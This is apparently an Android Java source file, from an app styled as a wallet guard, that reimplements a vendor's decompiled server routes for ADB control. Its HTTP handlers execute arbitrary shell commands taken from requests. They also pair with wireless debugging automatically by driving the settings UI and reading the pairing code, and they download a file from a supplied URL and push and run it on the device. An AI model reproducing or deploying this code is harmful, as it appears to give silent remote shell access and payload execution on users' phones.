package com.guard.wallet.server.handler;

import com.guard.wallet.adb.AdbConnectionManager;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import com.guard.wallet.core.AppUtils;
import android.util.Log;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.resp.PairResponseVO;
import com.koushikdutta.async.http.Multimap;
import com.guard.wallet.server.HttpResponseHelper;

/**
 * ADB 操作 Handler。
 * 对应 vendor server/b.java 中本地配对、端口探测、配置同步等路由。
 */
public final class AdbHandler {
    private static final String TAG = "HttpServer";

    private AdbHandler() {}

    /** 诊断端点: 返回 ADB 连接完整状态 */
    public static void adbDiag(AsyncHttpServerResponse response) {
        try {
            org.json.JSONObject diag = new org.json.JSONObject();
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            diag.put("managerExists", manager != null);
            if (manager != null) {
                diag.put("isPaired", manager.isPaired());
                diag.put("isConnected_D", manager.D());
                diag.put("isConnected_lib", manager.isConnected());
                diag.put("hasKeys", manager.hasKeys());
                // 尝试打开 shell stream 看看具体错误
                try {
                    io.github.muntashirakon.adb.AdbStream stream = manager.openStream(io.github.muntashirakon.adb.LocalServices.SHELL, "echo diag_test");
                    diag.put("streamOpen", true);
                    stream.close();
                } catch (Exception streamEx) {
                    diag.put("streamOpen", false);
                    diag.put("streamError", streamEx.getClass().getSimpleName() + ": " + streamEx.getMessage());
                }
            }
            HttpResponseHelper.ok(response, diag);
        } catch (Exception e) {
            HttpResponseHelper.error(response, "diag error: " + e.getMessage());
        }
    }

    public static void localAdbConnect(AsyncHttpServerResponse response, String command) {
        try {
            Log.d(TAG, "localAdbConnect: " + command);
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            boolean result = false;
            if (manager != null) {
                if (AppUtils.B(command)) {
                    // ADAPT: vendor 通过 periodicMaintenance + bootstrap gate 异步连接
                    // replica 在无命令时直接尝试 connectToPort，避免 bootstrap 12-tick 延迟
                    if (!manager.D()) {
                        Integer storedPort = com.guard.wallet.utils.SharedPrefsManager.b();
                        if (storedPort != null && storedPort > 0) {
                            Log.d(TAG, "直接 connectToPort: " + storedPort);
                            CheckPortResult portResult = manager.connectToPort(storedPort);
                            result = portResult != null && portResult.isConnected();
                        }
                        if (!result) {
                            manager.periodicMaintenance();
                            CheckPortResult scanResult = manager.scanForDebugPort();
                            result = scanResult != null;
                        }
                    } else {
                        result = true;
                    }
                } else {
                    result = manager.executeShellCommand(command);
                }
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void localAdbShell(AsyncHttpServerResponse response, String command) {
        try {
            Log.e("AdbDebug", "localAdbShell ENTER command=" + command);
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            Log.e("AdbDebug", "localAdbShell manager=" + manager
                + " isPaired=" + (manager != null ? manager.isPaired() : "null")
                + " isConnected=" + (manager != null ? manager.D() : "null"));
            boolean result = false;
            if (manager != null) {
                Log.e("AdbDebug", "localAdbShell calling executeShellCommand...");
                result = manager.executeShellCommand(command);
            } else {
                Log.e("AdbDebug", "localAdbShell manager is NULL!");
            }
            Log.e("AdbDebug", "localAdbShell result=" + result);
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) {
            Log.e("AdbDebug", "localAdbShell EXCEPTION", e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    // ADAPT: 调试用 — 直接调用 connectToPort 建立 ADB TLS 连接
    public static void localAdbDirectConnect(int port, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "localAdbDirectConnect port=" + port);
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            if (manager != null && port > 0) {
                CheckPortResult result = manager.connectToPort(port);
                if (result != null) {
                    HttpResponseHelper.ok(response, result);
                    return;
                }
            }
            HttpResponseHelper.ok(response, false);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void localAdbPair(Multimap params, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "localAdbPair");
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();

            String host = params.getString("host");
            String pairPort = params.getString("pairPort");
            String pairCode = params.getString("pairCode");
            boolean directConnect = Boolean.parseBoolean(params.getString("directConnect"));

            PairResponseVO vo = new PairResponseVO();
            vo.setDeviceId(com.guard.wallet.utils.SharedPrefsManager.l("deviceId"));
            vo.setPaired(false);
            vo.setDebugPort(0);
            vo.setConnected(false);

            if (manager != null && AppUtils.D(pairPort) && !AppUtils.B(pairCode)) {
                boolean paired = manager.pairDevice(host, Integer.parseInt(pairPort), pairCode);
                vo.setPaired(paired);
                if (paired && directConnect) {
                    CheckPortResult result = manager.scanForDebugPort();
                    if (result != null) {
                        vo.setDebugPort(result.getDebugPort());
                        vo.setConnected(result.isConnected());
                    }
                }
            }

            HttpResponseHelper.ok(response, vo);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void localAdbPush(AsyncHttpServerResponse response, String logId, String fileUrl, String fileName, String startCommand) {
        try {
            Log.d(TAG, "localAdbPush: fileUrl=" + fileUrl);
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            boolean result = manager != null && manager.downloadAndPush(logId, fileUrl, fileName, startCommand);
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    /**
     * vendor server/b.j2(null, kVar) — GET /requestLocalAdbPair
     * 全自动 UI 配对: 打开开发者选项 → 无线调试 → 读取配对码 → SPAKE2 配对
     */
    public static void requestLocalAdbPair(AsyncHttpServerResponse response) {
        try {
            Log.e(TAG, "requestLocalAdbPair: startPairingFlow");
            AdbConnectionManager.initialize();
            // startPairingFlow 内部有多处 T0() sleep 阻塞, 必须异步执行避免阻塞 HTTP server 线程
            new Thread(() -> {
                try {
                    com.guard.wallet.req.BlockViewVO blockView = new com.guard.wallet.req.BlockViewVO(false, null, false, false);
                    boolean result = AdbConnectionManager.startPairingFlow(blockView);
                    Log.e(TAG, "requestLocalAdbPair result=" + result);
                } catch (Exception e) {
                    Log.e(TAG, "requestLocalAdbPair async error", e);
                }
            }).start();
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void shareADBConfig(Object config, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "shareADBConfig");
            HttpResponseHelper.ok(response, com.guard.wallet.utils.SharedPrefsManager.J());
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void syncADBConfig(Object config, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "syncADBConfig");
            if (config instanceof ADBConfig) {
                HttpResponseHelper.ok(response, Boolean.valueOf(com.guard.wallet.utils.SharedPrefsManager.A((ADBConfig) config)));
                return;
            }
            HttpResponseHelper.ok(response, com.guard.wallet.utils.SharedPrefsManager.J());
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void rewriteDebugPort(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "rewriteDebugPort");
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            CheckPortResult result = manager == null ? null : manager.scanForDebugPort();
            if (result != null && result.getDebugPort() != null && com.guard.wallet.MainApplication.getInstance() != null) {
                com.guard.wallet.MainApplication.getInstance().rewriteDebugPort(result.getDebugPort());
                HttpResponseHelper.ok(response, true);
                return;
            }
            HttpResponseHelper.noContent(response);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void reloadPairKeyFiles(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "reloadPairKeyFiles");
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            boolean result = manager != null && manager.C() != null && manager.B() != null;
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }
}
